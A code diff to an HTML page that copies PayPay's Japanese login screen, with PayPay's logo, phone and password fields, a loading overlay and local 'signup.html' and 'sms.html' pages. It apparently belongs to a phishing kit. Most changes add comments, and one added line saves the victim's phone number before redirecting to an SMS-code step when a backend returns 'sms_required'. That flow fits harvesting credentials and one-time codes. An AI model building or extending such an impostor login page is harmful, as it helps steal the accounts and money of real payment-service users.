@@ -32,9 +32,11 @@
     .container { max-width: 100vw; margin: 0 auto; }
     .account-root-page { }
 
+    /* Fixed header */
     .top-header { position: relative; }
     .account-header { z-index: 100; background: #fff; width: 100%; position: fixed; top: 0; }
 
+    /* Header inner — signin is blue gradient */
     .header-signin {
       border: 0; border-bottom: 4px solid;
       flex-direction: row; flex: 1;
@@ -48,12 +50,14 @@
     .header-signin h2 { font-size: 26px; font-weight: 400; margin: 0; line-height: 1.2; }
     .header-more { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); }
 
+    /* Content area */
     .account-content {
       padding-top: 80px;
       -webkit-overflow-scrolling: touch;
       position: relative;
     }
 
+    /* Sign-in page */
     .account-signin-page {
       max-width: 440px; margin-left: auto; margin-right: auto; padding: 30px 20px;
     }
@@ -91,9 +95,11 @@
     .icon-xs { width: 16px; height: 16px; }
     .icon-sm { width: 24px; height: 24px; }
 
+    /* Forgot password */
     .reset-password { text-align: center; margin-top: 15px; font-size: 14px; font-weight: 600; }
     .reset-password a { color: #3895ff; }
 
+    /* Submit button */
     .submit-button {
       color: #fff; background-color: #3895ff; border: none; border-radius: 4px;
       width: 100%; height: 45px; margin-top: 30px; font-size: 14px;
@@ -102,8 +108,10 @@
     }
     .submit-button:disabled { background-color: #e6e6e6; cursor: default; }
 
+    /* Separator */
     .separate-text { color: #242424; margin: 2em 0 1em; padding: 0 10px; font-size: 1.25em; }
 
+    /* Yahoo! JAPAN ID button */
     .yconnect-action button {
       color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
       width: 100%; height: 44px; font-size: 14px;
@@ -116,6 +124,7 @@
     }
     .yconnect-action button span { flex: 1; text-align: center; }
 
+    /* SoftBank button */
     .sbconnect-action button {
       color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
       width: 100%; height: 44px; margin-top: 16px; font-size: 14px;
@@ -128,6 +137,7 @@
     }
     .sbconnect-action button span { flex: 1; text-align: center; }
 
+    /* Switch flow link */
     .switch-sign-flow {
       color: #3895ff; border-top: 1px solid #f2f2f2;
       margin-top: 60px; padding: 15px 0; font-size: 12px;
@@ -135,6 +145,7 @@
     .switch-sign-flow a { color: #3895ff; }
     .switch-sign-flow strong { font-size: 16px; padding-left: 10px; font-weight: 600; }
 
+    /* Error banner */
     .login-error {
       display: none; background: #fdecea; color: #c62828;
       border-radius: 4px; padding: 10px 14px;
@@ -142,6 +153,7 @@
     }
     .login-error.visible { display: block; }
 
+    /* Loading overlay */
     .loading-overlay {
       display: none; position: fixed; inset: 0;
       background: rgba(255,255,255,0.85); z-index: 9999;
@@ -165,6 +177,7 @@
     <div class="container">
       <section data-v-32bf0b5d="" class="account-root-page">
 
+        <!-- Fixed header -->
         <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
           <header data-v-b035e588="" class="header-signin">
             <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
@@ -173,11 +186,13 @@
           <div data-v-b035e588="" class="header-more"></div>
         </section>
 
+        <!-- Page content -->
         <div data-v-32bf0b5d="" class="account-content">
           <section data-v-991fda77="" data-v-32bf0b5d="" class="account-signin-page">
             <h3 data-v-991fda77="">PayPayに登録した携帯電話番号でログイン</h3>
 
             <section data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon">
+              <!-- Phone number input -->
               <div data-v-6ea1e05b="" class="username">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
@@ -186,6 +201,7 @@
                 </div>
               </div>
 
+              <!-- Password input -->
               <div data-v-6ea1e05b="" class="password">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
@@ -194,17 +210,22 @@
                 </div>
               </div>
 
+              <!-- Forgot password -->
               <div data-v-991fda77="" class="reset-password">
                 <a data-v-991fda77="" href="https://www.paypay.ne.jp/portal/oauth2/forgot-password?client_id=pay2-consumer-web-client">パスワードをお忘れですか？</a>
               </div>
 
+              <!-- Submit -->
               <button data-v-6ea1e05b="" id="login-loginBtn" class="submit-button" disabled="">ログイン</button>
 
+              <!-- Error -->
               <div class="login-error" id="loginError"></div>
             </section>
 
+            <!-- External account separator -->
             <div data-v-991fda77="" class="separate-text">外部のアカウントでログイン</div>
 
+            <!-- Yahoo! JAPAN ID -->
             <section data-v-cbe44f2d="" data-v-991fda77="" class="yconnect-action">
               <button data-v-cbe44f2d="" class="vm">
                 <i data-v-3c7781bb="" data-v-cbe44f2d="" class="component-icon icon-yahoo icon-sm ib vm"></i>
@@ -212,6 +233,7 @@
               </button>
             </section>
 
+            <!-- SoftBank button -->
             <section data-v-63b4f8a3="" data-v-991fda77="" class="sbconnect-action">
               <button data-v-63b4f8a3="" class="vm">
                 <i data-v-3c7781bb="" data-v-63b4f8a3="" class="component-icon icon-softbank-icon icon-sm ib vm"></i>
@@ -219,6 +241,7 @@
               </button>
             </section>
 
+            <!-- Switch to signup -->
             <div data-v-991fda77="" class="switch-sign-flow">
               アカウントをお持ちでない場合
               <a data-v-991fda77="" href="signup.html">
@@ -233,6 +256,7 @@
   </div>
 </div>
 
+<!-- Loading overlay -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="spinner"></div>
   <div class="loading-text">ログイン中...</div>
@@ -291,6 +315,7 @@
       }
 
       if (data.status === "sms_required") {
+        sessionStorage.setItem("paypay_phone", phone);
         window.location.href = "sms.html";
       }
 
